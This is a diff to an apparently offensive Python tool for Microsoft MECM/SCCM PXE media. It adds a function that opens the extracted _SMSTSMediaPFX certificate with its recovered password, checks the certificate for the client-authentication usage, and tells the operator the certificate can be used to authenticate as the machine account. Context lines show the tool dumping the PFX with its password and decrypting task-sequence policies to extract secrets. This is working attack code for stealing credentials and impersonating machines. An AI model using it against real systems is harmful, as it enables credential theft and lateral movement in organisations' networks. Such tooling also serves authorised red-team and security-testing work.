@@ -23,6 +23,10 @@ from requests_toolbelt import MultipartEncoder,MultipartDecoder
 import zlib
 import datetime
 from os import walk,system
+from cryptography.hazmat.primitives.serialization import pkcs12
+from cryptography.x509.oid import ExtensionOID, ObjectIdentifier
+from cryptography.hazmat.backends import default_backend
+from cryptography.x509 import DNSName
 from ipaddress import IPv4Network,IPv4Address
 if platform.system().lower().startswith('win'):
     import win32crypt
@@ -469,12 +473,45 @@ def use_encrypted_key(encrypted_key, media_file_path):
     
     print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
     write_to_binary_file(filename,smsTSMediaPFX)
+    check_clientauthcert(filename, smsMediaGuid)
     
     if osName == "Windows":
         process_pxe_bootable_and_prestaged_media(media_variables)
     else:
         print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")
+        
+def check_clientauthcert(certificate, password):
+    # Check if certificate contains client auth
+    subject = None
+    pfx_file = certificate
+    pfx_password = bytes(password, encoding= 'utf-8')
+    # Read PFX
+    with open(pfx_file, "rb") as f:
+        pfx_data = f.read()
+    private_key, certificate, additional_certificates = pkcs12.load_key_and_certificates(pfx_data, pfx_password, backend=default_backend())
+    subject = certificate.subject
+    if subject.rdns:
+        subject = subject.rdns
+    else:
+        try:
+            san_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
+            san = san_extension.value
+            dns_names = san.get_values_for_type(DNSName)
+            if dns_names:
+                subject = dns_names[0]
+        except Exception as e:
+            print(e)
 
+    # Check OID 1.3.6.1.5.5.7.3.2 (clientAuth)
+    try:
+        extended_key_usage_extension = certificate.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
+        extended_key_usage = extended_key_usage_extension.value
+        client_auth_oid = ObjectIdentifier("1.3.6.1.5.5.7.3.2")
+        if client_auth_oid in extended_key_usage:
+            print("[!] PFX - Client Authentication is enabled for subject " + subject + ". You can try to use it to authenticate as the machine account!")
+    except Exception as e:
+        print(e)
+  
 #Parse the downloaded task sequences and extract sensitive data if present
 def dowload_and_decrypt_policies_using_certificate(guid,cert_bytes):
     
@@ -906,6 +943,7 @@ if __name__ == "__main__":
     
         print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
         write_to_binary_file(filename,smsTSMediaPFX)
+        check_clientauthcert(filename, smsMediaGuid)
     
         if osName == "Windows":
             process_pxe_bootable_and_prestaged_media(media_variables)
